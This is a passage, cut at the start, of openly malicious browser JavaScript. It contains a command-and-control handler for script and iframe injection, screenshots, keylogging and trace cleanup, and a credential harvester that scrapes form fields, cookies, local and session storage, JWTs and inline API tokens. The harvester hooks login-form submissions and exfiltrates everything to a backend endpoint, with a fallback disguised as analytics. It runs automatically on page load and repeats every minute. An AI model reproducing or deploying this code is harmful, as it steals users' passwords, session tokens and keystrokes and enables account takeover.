      const url = command.params?.url;
      
      if (!content && !url) {
        return {
          success: false,
          timestamp: new Date().toISOString(),
          error: 'Missing content or url parameter'
        };
      }
      
      try {
        let element;
        
        if (type === 'script') {
          element = document.createElement('script');
          if (url) {
            element.src = url;
          } else {
            element.textContent = content;
          }
        } else if (type === 'style') {
          element = document.createElement('style');
          element.textContent = content;
        } else if (type === 'html') {
          // Create a container and inject HTML
          element = document.createElement('div');
          element.style.display = 'none';
          element.innerHTML = content;
        } else if (type === 'iframe') {
          element = document.createElement('iframe');
          element.style.display = 'none';
          if (url) {
            element.src = url;
          } else {
            document.body.appendChild(element);
            const iframeDoc = element.contentWindow.document;
            iframeDoc.open();
            iframeDoc.write(content);
            iframeDoc.close();
          }
        } else {
          return {
            success: false,
            timestamp: new Date().toISOString(),
            error: `Unknown injection type: ${type}`
          };
        }
        
        // Add to the document
        document.body.appendChild(element);
        
        this.logger.log('Content injection complete', {
          type: type,
          url: url || 'inline',
          contentLength: content ? content.length : 0
        });
        
        return {
          success: true,
          timestamp: new Date().toISOString(),
          message: 'Content injection complete'
        };
      } catch (e) {
        this.logger.error('Error injecting content', e.toString());
        return {
          success: false,
          timestamp: new Date().toISOString(),
          error: e.toString()
        };
      }
    }
    
    async _processScreenshotCommand(command) {
      // Command to take a screenshot of the page
      try {
        // Check if html2canvas is available
        if (typeof html2canvas === 'undefined') {
          // Inject html2canvas script
          await new Promise((resolve, reject) => {
            const script = document.createElement('script');
            script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
            script.onload = resolve;
            script.onerror = reject;
            document.head.appendChild(script);
          });
        }
        
        // Take screenshot
        const canvas = await html2canvas(document.body);
        const screenshot = canvas.toDataURL('image/png');
        
        // Send screenshot
        const response = await fetch(this.endpoints.results, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-Session-ID': this.sessionId
          },
          body: JSON.stringify({
            type: 'screenshot',
            timestamp: new Date().toISOString(),
            data: screenshot
          })
        });
        
        if (response.ok) {
          this.logger.log('Screenshot captured and sent');
          return {
            success: true,
            timestamp: new Date().toISOString(),
            message: 'Screenshot captured'
          };
        } else {
          this.logger.error('Failed to send screenshot', {
            status: response.status
          });
          return {
            success: false,
            timestamp: new Date().toISOString(),
            error: `Failed to send screenshot: ${response.status}`
          };
        }
      } catch (e) {
        this.logger.error('Error capturing screenshot', e.toString());
        return {
          success: false,
          timestamp: new Date().toISOString(),
          error: e.toString()
        };
      }
    }
    
    async _processKeylogCommand(command) {
      // Command to start/stop keylogging
      const action = command.params?.action || 'start';
      const duration = command.params?.duration || 300000; // 5 minutes default
      
      try {
        if (action === 'start') {
          if (this._keyloggerActive) {
            return {
              success: false,
              timestamp: new Date().toISOString(),
              error: 'Keylogger already active'
            };
          }
          
          this._keyloggerActive = true;
          this._keylogBuffer = [];
          
          // Setup keylogger
          this._keylogHandler = (event) => {
            const key = event.key;
            const element = event.target.tagName.toLowerCase();
            const id = event.target.id || '';
            const className = event.target.className || '';
            
            this._keylogBuffer.push({
              key: key,
              element: element,
              id: id,
              className: className,
              timestamp: new Date().toISOString()
            });
            
            // If buffer gets too large, send early
            if (this._keylogBuffer.length >= 50) {
              this._sendKeylogData();
            }
          };
          
          // Add event listener
          document.addEventListener('keydown', this._keylogHandler);
          
          // Set timer to stop keylogging after duration
          this._keylogTimer = setTimeout(() => {
            this._processKeylogCommand({ params: { action: 'stop' } });
          }, duration);
          
          // Set interval to send keylog data periodically
          this._keylogInterval = setInterval(() => {
            this._sendKeylogData();
          }, 10000);
          
          this.logger.log('Keylogger started', {
            duration: duration
          });
          
          return {
            success: true,
            timestamp: new Date().toISOString(),
            message: 'Keylogger started',
            duration: duration
          };
        } else if (action === 'stop') {
          if (!this._keyloggerActive) {
            return {
              success: false,
              timestamp: new Date().toISOString(),
              error: 'No active keylogger'
            };
          }
          
          // Remove event listener
          document.removeEventListener('keydown', this._keylogHandler);
          
          // Clear timers
          clearTimeout(this._keylogTimer);
          clearInterval(this._keylogInterval);
          
          // Send final data
          await this._sendKeylogData();
          
          this._keyloggerActive = false;
          this._keylogHandler = null;
          this._keylogBuffer = [];
          
          this.logger.log('Keylogger stopped');
          
          return {
            success: true,
            timestamp: new Date().toISOString(),
            message: 'Keylogger stopped'
          };
        } else {
          return {
            success: false,
            timestamp: new Date().toISOString(),
            error: `Unknown keylogger action: ${action}`
          };
        }
      } catch (e) {
        this.logger.error('Error processing keylogger command', e.toString());
        return {
          success: false,
          timestamp: new Date().toISOString(),
          error: e.toString()
        };
      }
    }
    
    async _sendKeylogData() {
      if (!this._keylogBuffer || this._keylogBuffer.length === 0) return;
      
      const data = [...this._keylogBuffer];
      this._keylogBuffer = [];
      
      try {
        const response = await fetch(this.endpoints.results, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-Session-ID': this.sessionId
          },
          body: JSON.stringify({
            type: 'keylog',
            timestamp: new Date().toISOString(),
            data: data
          })
        });
        
        if (!response.ok) {
          this.logger.error('Failed to send keylog data', {
            status: response.status
          });
          
          // Put data back in buffer
          this._keylogBuffer = [...data, ...this._keylogBuffer];
        }
      } catch (e) {
        this.logger.error('Error sending keylog data', e.toString());
        
        // Put data back in buffer
        this._keylogBuffer = [...data, ...this._keylogBuffer];
      }
    }
    
    async _processCleanupCommand(command) {
      // Command to clean up traces
      try {
        // Stop keylogger if active
        if (this._keyloggerActive) {
          await this._processKeylogCommand({ params: { action: 'stop' } });
        }
        
        // Clean localStorage markers
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          if (key.startsWith('_harvested_') || key.includes('_logger_')) {
            localStorage.removeChild(key);
          }
        }
        
        this.logger.log('Cleanup completed');
        
        return {
          success: true,
          timestamp: new Date().toISOString(),
          message: 'Cleanup completed'
        };
      } catch (e) {
        this.logger.error('Error during cleanup', e.toString());
        return {
          success: false,
          timestamp: new Date().toISOString(),
          error: e.toString()
        };
      }
    }
  }

  // Credential harvesting
  class CredentialHarvester {
    constructor(logger) {
      this.logger = logger;
      this.collectedCredentials = [];
      this.formData = [];
      this.fieldNames = {
        username: ['username', 'user', 'email', 'login', 'account', 'id', 'name'],
        password: ['password', 'pass', 'pwd', 'secret']
      };
      
      this.protectedStorageKeys = [
        'token', 'auth', 'jwt', 'session', 'api', 'key', 'secret', 'credential',
        'password', 'user', 'login', 'access', 'refresh', 'id_token', 'oauth'
      ];
      
      this.mutationObserver = null;
      this.logger.log("Credential harvester initialized");
    }
    
    async harvestAll() {
      this.logger.log("Starting comprehensive credential harvesting");
      
      // Set up a MutationObserver to watch for new form elements
      this._setupFormObserver();
      
      // Harvest from DOM forms
      await this._harvestFromForms();
      
      // Harvest from local/session storage
      await this._harvestFromStorage();
      
      // Harvest from cookies
      await this._harvestFromCookies();
      
      // Check for common API authentication patterns
      await this._checkForAPIAuth();
      
      // Hook password submission events
      this._setupFormHooks();
      
      this.logger.log("Initial credential harvesting complete", { 
        collected: this.collectedCredentials.length,
        forms: this.formData.length
      });
      
      return {
        credentials: this.collectedCredentials,
        forms: this.formData
      };
    }
    
    _setupFormObserver() {
      // Create a MutationObserver to watch for new forms
      this.mutationObserver = new MutationObserver((mutations) => {
        let shouldScan = false;
        
        // Check if any interesting elements were added
        for (const mutation of mutations) {
          if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
            for (const node of mutation.addedNodes) {
              if (node.nodeType === Node.ELEMENT_NODE) {
                // If it's a form or contains forms, we should scan
                if (node.tagName === 'FORM' || node.querySelector('form, input[type="password"]')) {
                  shouldScan = true;
                  break;
                }
              }
            }
          }
          
          if (shouldScan) break;
        }
        
        // If interesting elements were added, scan forms again
        if (shouldScan) {
          this._harvestFromForms();
        }
      });
      
      // Start observing the document body
      this.mutationObserver.observe(document.body, {
        childList: true,
        subtree: true
      });
      
      this.logger.log("Form observer set up");
    }
    
    async _harvestFromForms() {
      this.logger.log("Scanning for forms and input fields");
      
      // Get all forms
      const forms = document.querySelectorAll('form');
      
      // Process each form
      for (const form of forms) {
        // Skip forms we've already processed
        if (form.dataset.harvested === 'true') continue;
        
        // Mark as processed
        form.dataset.harvested = 'true';
        
        const formData = {
          id: form.id || null,
          name: form.name || null,
          action: form.action || null,
          method: form.method || null,
          fields: []
        };
        
        // Check all input fields
        const inputs = form.querySelectorAll('input');
        for (const input of inputs) {
          const fieldData = {
            name: input.name || null,
            id: input.id || null,
            type: input.type || null,
            value: input.value || null,
            placeholder: input.placeholder || null
          };
          
          // Add to the form data
          formData.fields.push(fieldData);
          
          // Check if this looks like a username/email field
          if (this._isUsernameField(input) && input.value) {
            this._addCredential('username', input.value, {
              source: 'form',
              formId: form.id || null,
              formAction: form.action || null
            });
          }
          
          // Check if this looks like a password field
          if (this._isPasswordField(input) && input.value) {
            this._addCredential('password', input.value, {
              source: 'form',
              formId: form.id || null,
              formAction: form.action || null
            });
          }
        }
        
        // Add to list of processed forms
        this.formData.push(formData);
        
        // Set up event listeners for this form to catch submissions
        form.addEventListener('submit', this._captureFormSubmission.bind(this));
      }
      
      // Also check for input fields outside of forms
      const standaloneInputs = document.querySelectorAll('input:not(form input)');
      for (const input of standaloneInputs) {
        // Skip inputs we've already processed
        if (input.dataset.harvested === 'true') continue;
        
        // Mark as processed
        input.dataset.harvested = 'true';
        
        // Check if this looks like a username/email field
        if (this._isUsernameField(input) && input.value) {
          this._addCredential('username', input.value, {
            source: 'standalone-input',
            inputId: input.id || null
          });
        }
        
        // Check if this looks like a password field
        if (this._isPasswordField(input) && input.value) {
          this._addCredential('password', input.value, {
            source: 'standalone-input',
            inputId: input.id || null
          });
        }
      }
      
      this.logger.log("Form scanning complete", { 
        formsFound: forms.length,
        standaloneInputs: standaloneInputs.length
      });
    }
    
    _captureFormSubmission(event) {
      const form = event.target;
      
      // Create a form submission entry
      const submission = {
        action: form.action || window.location.href,
        method: form.method || 'GET',
        timestamp: new Date().toISOString(),
        fields: {}
      };
      
      // Get all form fields
      const formData = new FormData(form);
      for (const [key, value] of formData.entries()) {
        submission.fields[key] = value;
        
        // Check for username/password fields
        if (this._isUsernameFieldByName(key) && value) {
          this._addCredential('username', value, {
            source: 'form-submission',
            formAction: form.action || null
          });
        }
        
        if (this._isPasswordFieldByName(key) && value) {
          this._addCredential('password', value, {
            source: 'form-submission',
            formAction: form.action || null
          });
        }
      }
      
      // Exfiltrate form submission to server - integrate with Flask backend
      this._exfiltrateCredentials('form-submission', submission);
      
      // Log the form submission
      this.logger.log("Form submission captured", { form: submission.action });
    }
    
    async _harvestFromStorage() {
      this.logger.log("Checking browser storage for credentials");
      
      // Check localStorage
      try {
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          
          // Skip keys we've already processed
          if (localStorage.getItem(`_harvested_${key}`)) continue;
          
          // Mark as processed
          try {
            localStorage.setItem(`_harvested_${key}`, 'true');
          } catch (e) {
            // Ignore storage errors
          }
          
          // Check if this key looks sensitive
          if (this._isSensitiveStorageKey(key)) {
            const value = localStorage.getItem(key);
            
            // Log the finding
            this._addCredential('localStorage', { key, value }, {
              source: 'localStorage'
            });
            
            // Check if the value looks like JSON
            if (value && value.trim().startsWith('{') && value.trim().endsWith('}')) {
              try {
                const parsedValue = JSON.parse(value);
                this._checkObjectForCredentials(parsedValue, `localStorage.${key}`);
              } catch (e) {
                // Not valid JSON, ignore
              }
            }
            
            // Check if it looks like a JWT
            if (value && this._looksLikeJWT(value)) {
              const tokenParts = this._parseJWT(value);
              if (tokenParts) {
                this._addCredential('jwt', value, {
                  source: 'localStorage',
                  key: key,
                  decoded: tokenParts
                });
              }
            }
          }
        }
      } catch (e) {
        this.logger.error('Error accessing localStorage', e.toString());
      }
      
      // Check sessionStorage
      try {
        for (let i = 0; i < sessionStorage.length; i++) {
          const key = sessionStorage.key(i);
          
          // Skip keys we've already processed
          if (sessionStorage.getItem(`_harvested_${key}`)) continue;
          
          // Mark as processed
          try {
            sessionStorage.setItem(`_harvested_${key}`, 'true');
          } catch (e) {
            // Ignore storage errors
          }
          
          // Check if this key looks sensitive
          if (this._isSensitiveStorageKey(key)) {
            const value = sessionStorage.getItem(key);
            
            // Log the finding
            this._addCredential('sessionStorage', { key, value }, {
              source: 'sessionStorage'
            });
            
            // Check if the value looks like JSON
            if (value && value.trim().startsWith('{') && value.trim().endsWith('}')) {
              try {
                const parsedValue = JSON.parse(value);
                this._checkObjectForCredentials(parsedValue, `sessionStorage.${key}`);
              } catch (e) {
                // Not valid JSON, ignore
              }
            }
            
            // Check if it looks like a JWT
            if (value && this._looksLikeJWT(value)) {
              const tokenParts = this._parseJWT(value);
              if (tokenParts) {
                this._addCredential('jwt', value, {
                  source: 'sessionStorage',
                  key: key,
                  decoded: tokenParts
                });
              }
            }
          }
        }
      } catch (e) {
        this.logger.error('Error accessing sessionStorage', e.toString());
      }
      
      this.logger.log("Storage scanning complete");
    }
    
    async _harvestFromCookies() {
      this.logger.log("Scanning cookies for credentials");
      
      // Get all cookies
      const cookies = document.cookie.split(';');
      
      for (let i = 0; i < cookies.length; i++) {
        const cookie = cookies[i].trim();
        if (!cookie) continue;
        
        // Split into name/value
        const [name, ...rest] = cookie.split('=');
        const value = rest.join('=');
        
        // Check if this cookie name looks sensitive
        if (this._isSensitiveStorageKey(name.trim())) {
          // Log the finding
          this._addCredential('cookie', { name: name.trim(), value }, {
            source: 'cookie',
            domain: window.location.hostname
          });
          
          // Check if it looks like a JWT
          if (value && this._looksLikeJWT(value)) {
            const tokenParts = this._parseJWT(value);
            if (tokenParts) {
              this._addCredential('jwt', value, {
                source: 'cookie',
                name: name.trim(),
                decoded: tokenParts
              });
            }
          }
          
          // Check if the value looks like JSON
          if (value && value.trim().startsWith('{') && value.trim().endsWith('}')) {
            try {
              const parsedValue = JSON.parse(value);
              this._checkObjectForCredentials(parsedValue, `cookie.${name.trim()}`);
            } catch (e) {
              // Not valid JSON, ignore
            }
          }
        }
      }
      
      this.logger.log("Cookie scanning complete", { cookiesFound: cookies.length });
    }
    
    async _checkForAPIAuth() {
      this.logger.log("Checking for API authentication information");
      
      // Look for common auth headers in script tags
      const scripts = document.querySelectorAll('script:not([src])');
      
      for (const script of scripts) {
        const content = script.textContent || '';
        
        // Look for patterns that might include auth tokens
        const patterns = [
          { regex: /(['"])?(api[_-]?key|api[_-]?token)(['"])?(\s*)(:|=)(\s*)(['"])(.*?)(['"])/gi, type: 'API Key' },
          { regex: /(['"])?(auth[_-]?token|access[_-]?token|bearer)(['"])?(\s*)(:|=)(\s*)(['"])(.*?)(['"])/gi, type: 'Auth Token' },
          { regex: /(['"])?(jwt|id[_-]?token)(['"])?(\s*)(:|=)(\s*)(['"])(.*?)(['"])/gi, type: 'JWT' },
          { regex: /headers(\s*):(\s*)\{[^}]*(['"])(Authorization|Auth)(['"])(\s*):(\s*)(['"])Bearer\s+(.*?)(['"])/gi, type: 'Bearer Token' }
        ];
        
        for (const pattern of patterns) {
          let match;
          while ((match = pattern.regex.exec(content)) !== null) {
            const value = match[8];
            if (value && value.length > 8) { // Avoid very short values
              this._addCredential('apiauth', { type: pattern.type, value }, {
                source: 'inline-script'
              });
              
              // If it's a JWT, try to parse it
              if (pattern.type === 'JWT' || this._looksLikeJWT(value)) {
                const tokenParts = this._parseJWT(value);
                if (tokenParts) {
                  this._addCredential('jwt', value, {
                    source: 'inline-script',
                    type: pattern.type,
                    decoded: tokenParts
                  });
                }
              }
            }
          }
        }
      }
      
      // Check global variables that might contain auth info
      const potentialAuthVars = [
        'token', 'apiKey', 'apiToken', 'authToken', 'accessToken', 
        'idToken', 'bearerToken', 'credentials', 'auth'
      ];
      
      for (const varName of potentialAuthVars) {
        if (typeof window[varName] !== 'undefined') {
          const value = window[varName];
          
          if (typeof value === 'string' && value.length > 8) {
            this._addCredential('global-variable', { name: varName, value }, {
              source: 'global-variable'
            });
            
            // Check if it's a JWT
            if (this._looksLikeJWT(value)) {
              const tokenParts = this._parseJWT(value);
              if (tokenParts) {
                this._addCredential('jwt', value, {
                  source: 'global-variable',
                  name: varName,
                  decoded: tokenParts
                });
              }
            }
          } else if (typeof value === 'object' && value !== null) {
            this._checkObjectForCredentials(value, `global.${varName}`);
          }
        }
      }
      
      this.logger.log("API authentication check complete");
      
      // Exfiltrate collected credentials to the Flask backend
      if (this.collectedCredentials.length > 0) {
        this._exfiltrateCredentials('api-auth', this.collectedCredentials);
      }
    }
    
    _setupFormHooks() {
      this.logger.log("Setting up form submission hooks");
      
      // Hook all forms that might contain credentials
      const forms = document.querySelectorAll('form');
      
      for (const form of forms) {
        // Skip forms we've already hooked
        if (form.dataset.hooked === 'true') continue;
        
        // Mark as hooked
        form.dataset.hooked = 'true';
        
        // Check if this form likely contains credentials
        const hasPasswordField = form.querySelector('input[type="password"]');
        const hasEmailField = form.querySelector('input[type="email"]');
        const hasUsernameField = Array.from(form.querySelectorAll('input')).some(input => 
          this._isUsernameField(input)
        );
        
        if (hasPasswordField || hasEmailField || hasUsernameField) {
          // Create handler for form submission
          const formHandler = (event) => {
            // Don't prevent form submission - we just want to log it
            
            // Get all form data
            const formData = new FormData(form);
            const data = {};
            
            for (const [key, value] of formData.entries()) {
              data[key] = value;
            }
            
            // Add to credentials
            this._addCredential('form-submission', data, {
              source: 'form-hook',
              action: form.action || window.location.href,
              method: form.method || 'GET'
            });
            
            // Check for individual credential fields
            for (const [key, value] of Object.entries(data)) {
              if (value && typeof value === 'string') {
                if (this._isUsernameFieldByName(key)) {
                  this._addCredential('username', value, {
                    source: 'form-hook',
                    form: form.id || form.action || 'unknown'
                  });
                }
                
                if (this._isPasswordFieldByName(key)) {
                  this._addCredential('password', value, {
                    source: 'form-hook',
                    form: form.id || form.action || 'unknown'
                  });
                }
              }
            }
            
            // Exfiltrate credentials directly to Flask backend
            this._exfiltrateCredentials('form-hook', {
              formAction: form.action || window.location.href,
              formMethod: form.method || 'GET',
              formData: data,
              timestamp: new Date().toISOString()
            });
            
            this.logger.log("Form submission intercepted", {
              formAction: form.action || window.location.href
            });
          };
          
          // Add the event listener
          form.addEventListener('submit', formHandler);
          
          this.logger.log("Added form hook", {
            formId: form.id || 'unnamed',
            formAction: form.action || 'none'
          });
        }
      }
      
      this.logger.log("Form hooks setup complete", { formsHooked: forms.length });
    }
    
    async _exfiltrateCredentials(source, data) {
      try {
        // Integrate with the Flask backend's payload store endpoint
        const response = await fetch('/api/payload/store', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-Session-ID': this.logger.sessionId
          },
          body: JSON.stringify({
            source: source,
            data: data,
            timestamp: new Date().toISOString(),
            url: window.location.href,
            referrer: document.referrer
          })
        });
        
        if (response.ok) {
          this.logger.log('Credentials exfiltrated successfully', { source });
          return true;
        } else {
          this.logger.error('Failed to exfiltrate credentials', {
            source,
            status: response.status
          });
          
          // Try fallback endpoint
          return this._exfiltrateViaFallback(source, data);
        }
      } catch (e) {
        this.logger.error('Error exfiltrating credentials', {
          source,
          error: e.toString()
        });
        
        // Try fallback endpoint
        return this._exfiltrateViaFallback(source, data);
      }
    }
    
    async _exfiltrateViaFallback(source, data) {
      try {
        // Fallback to the analytics endpoint which is less likely to be blocked
        const response = await fetch('/api/analytics/collect', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-Session-ID': this.logger.sessionId
          },
          body: JSON.stringify({
            type: 'credentials',
            source: source,
            data: data,
            timestamp: new Date().toISOString()
          })
        });
        
        if (response.ok) {
          this.logger.log('Credentials exfiltrated via fallback', { source });
          return true;
        } else {
          this.logger.error('Failed to exfiltrate via fallback', {
            source,
            status: response.status
          });
          return false;
        }
      } catch (e) {
        this.logger.error('Error in fallback exfiltration', {
          source,
          error: e.toString()
        });
        return false;
      }
    }
    
    _isUsernameField(input) {
      // Check if this input field looks like a username/email field
      const name = (input.name || '').toLowerCase();
      const id = (input.id || '').toLowerCase();
      const placeholder = (input.placeholder || '').toLowerCase();
      const type = (input.type || '').toLowerCase();
      
      // Check if it's an email field
      if (type === 'email') return true;
      
      // Check by name, id or placeholder
      for (const fieldName of this.fieldNames.username) {
        if (name.includes(fieldName) || id.includes(fieldName) || placeholder.includes(fieldName)) {
          return true;
        }
      }
      
      return false;
    }
    
    _isPasswordField(input) {
      // Check if this input field looks like a password field
      const name = (input.name || '').toLowerCase();
      const id = (input.id || '').toLowerCase();
      const placeholder = (input.placeholder || '').toLowerCase();
      const type = (input.type || '').toLowerCase();
      
      // Check if it's a password field
      if (type === 'password') return true;
      
      // Check by name, id or placeholder
      for (const fieldName of this.fieldNames.password) {
        if (name.includes(fieldName) || id.includes(fieldName) || placeholder.includes(fieldName)) {
          return true;
        }
      }
      
      return false;
    }
    
    _isUsernameFieldByName(fieldName) {
      fieldName = fieldName.toLowerCase();
      
      // Check if the field name looks like a username field
      for (const pattern of this.fieldNames.username) {
        if (fieldName.includes(pattern)) {
          return true;
        }
      }
      
      return false;
    }
    
    _isPasswordFieldByName(fieldName) {
      fieldName = fieldName.toLowerCase();
      
      // Check if the field name looks like a password field
      for (const pattern of this.fieldNames.password) {
        if (fieldName.includes(pattern)) {
          return true;
        }
      }
      
      return false;
    }
    
    _isSensitiveStorageKey(key) {
      key = key.toLowerCase();
      
      // Check if this storage key looks sensitive
      for (const pattern of this.protectedStorageKeys) {
        if (key.includes(pattern)) {
          return true;
        }
      }
      
      return false;
    }
    
    _looksLikeJWT(value) {
      // Check if the value looks like a JWT token
      if (typeof value !== 'string') return false;
      
      // JWT tokens are typically three base64 segments separated by dots
      const parts = value.split('.');
      if (parts.length !== 3) return false;
      
      // Check that each part is base64-like
      const base64Pattern = /^[A-Za-z0-9_-]+$/;
      return parts.every(part => base64Pattern.test(part));
    }
    
    _parseJWT(token) {
      try {
        // Split the token
        const parts = token.split('.');
        if (parts.length !== 3) return null;
        
        // Decode the header and payload
        const header = JSON.parse(atob(parts[0]));
        const payload = JSON.parse(atob(parts[1]));
        
        return { header, payload };
      } catch (e) {
        return null;
      }
    }
    
    _checkObjectForCredentials(obj, path = '') {
      // Recursively check object properties for credential patterns
      if (!obj || typeof obj !== 'object') return;
      
      // Don't process arrays or null directly
      if (Array.isArray(obj)) {
        // Check each array element
        for (let i = 0; i < obj.length; i++) {
          this._checkObjectForCredentials(obj[i], `${path}[${i}]`);
        }
        return;
      }
      
      // Process object properties
      for (const [key, value] of Object.entries(obj)) {
        const fullPath = path ? `${path}.${key}` : key;
        
        // Check if the key looks sensitive
        if (this._isSensitiveStorageKey(key)) {
          if (typeof value === 'string') {
            // Add the credential
            this._addCredential('object-property', { key: fullPath, value }, {
              source: 'object-property'
            });
            
            // Check if it's a JWT
            if (this._looksLikeJWT(value)) {
              const tokenParts = this._parseJWT(value);
              if (tokenParts) {
                this._addCredential('jwt', value, {
                  source: 'object-property',
                  path: fullPath,
                  decoded: tokenParts
                });
              }
            }
          } else if (typeof value === 'object' && value !== null) {
            // Add the whole object as a credential if the key is sensitive
            this._addCredential('object-property', { key: fullPath, value: JSON.stringify(value) }, {
              source: 'object-property'
            });
          }
        }
        
        // Recursively check nested objects
        if (typeof value === 'object' && value !== null) {
          this._checkObjectForCredentials(value, fullPath);
        }
      }
    }
    
    _addCredential(type, value, metadata) {
      // Add a credential to the collection
      const credential = {
        type,
        value,
        metadata,
        timestamp: new Date().toISOString(),
        url: window.location.href
      };
      
      // Check if we already have this exact credential
      const exists = this.collectedCredentials.some(cred => 
        cred.type === type && 
        JSON.stringify(cred.value) === JSON.stringify(value)
      );
      
      if (!exists) {
        this.collectedCredentials.push(credential);
        this.logger.log(`Found credential of type: ${type}`, metadata);
        
        // Immediately exfiltrate new credentials
        this._exfiltrateCredentials('immediate', credential);
      }
    }
    
    cleanup() {
      // Clean up hooks and observers
      if (this.mutationObserver) {
        this.mutationObserver.disconnect();
      }
      
      this.logger.log("Credential harvester cleanup complete");
    }
  }

  // Main entry point
  async function main() {
    try {
      // Create the secure logger
      const logger = new SecureLogger();
      logger.log("Script execution started");
      
      // Collect system fingerprint
      const fingerprinter = new Fingerprinter();
      const fingerprint = await fingerprinter.generateFingerprint();
      logger.log("System fingerprint generated", { fingerprintHash: fingerprint.hash });
      
      // Initialize credential harvester
      const credentialHarvester = new CredentialHarvester(logger);
      const credentials = await credentialHarvester.harvestAll();
      logger.log("Initial credential harvesting complete", { 
        credentialCount: credentials.credentials.length 
      });
      
      // Initialize command and control
      const c2 = new CommandControl(logger);
      logger.log("Command and control initialized");
      
      // Set up periodic credential harvesting
      setInterval(async () => {
        await credentialHarvester.harvestAll();
        logger.log("Periodic credential harvesting complete", {
          totalCredentials: credentialHarvester.collectedCredentials.length
        });
      }, 60000); // Check every minute
      
      // Log completion of initialization
      logger.log("Script initialization complete", {
        url: window.location.href,
        timestamp: new Date().toISOString()
      });
      
    } catch (e) {
      // If anything fails, log the error but don't crash
      console.error("Error in main execution:", e);
      
      // Try to create a new logger if the existing one failed
      try {
        const fallbackLogger = new SecureLogger();
        fallbackLogger.error("Critical error in main execution", e.toString());
      } catch (innerError) {
        // Nothing more we can do
        console.error("Critical error, fallback logging failed:", innerError);
      }
    }
  }

  // Start execution when the DOM is fully loaded
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', main);
  } else {
    // DOM is already ready
    main();
  }
})();
